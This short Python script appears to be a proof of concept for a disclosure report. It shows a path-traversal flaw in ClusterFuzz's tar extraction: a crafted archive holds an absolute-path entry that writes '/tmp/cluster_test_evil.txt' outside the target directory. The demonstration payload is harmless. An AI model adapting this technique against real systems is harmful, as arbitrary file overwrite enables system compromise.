"""
Clone the latest commit of clusterfuzz from GitHub, then use the command 
`pip install -e clusterfuzz/src` to install clusterfuzz into your environment. 
After executing this code, you'll observe that a file named `/tmp/cluster_test_evil.txt` 
is created with the content `evil`.
"""

import io
import tarfile
from clusterfuzz._internal.system.archive import TarArchiveReader


with tarfile.open("evil.tar", "w") as tar:
    file_data = io.BytesIO(b"normal\n")
    normal_tarinfo = tarfile.TarInfo(name="normal.txt")
    normal_tarinfo.size = len(file_data.getbuffer())
    tar.addfile(normal_tarinfo, fileobj=file_data)


    file_data = io.BytesIO(b"evil\n")
    evil_path = "/tmp/cluster_test_evil.txt"
    evil_tarinfo = tarfile.TarInfo(name=evil_path)
    evil_tarinfo.size = len(file_data.getbuffer())
    tar.addfile(evil_tarinfo, fileobj=file_data)


extractor = TarArchiveReader("evil.tar")
extractor.extract_all("tmp")
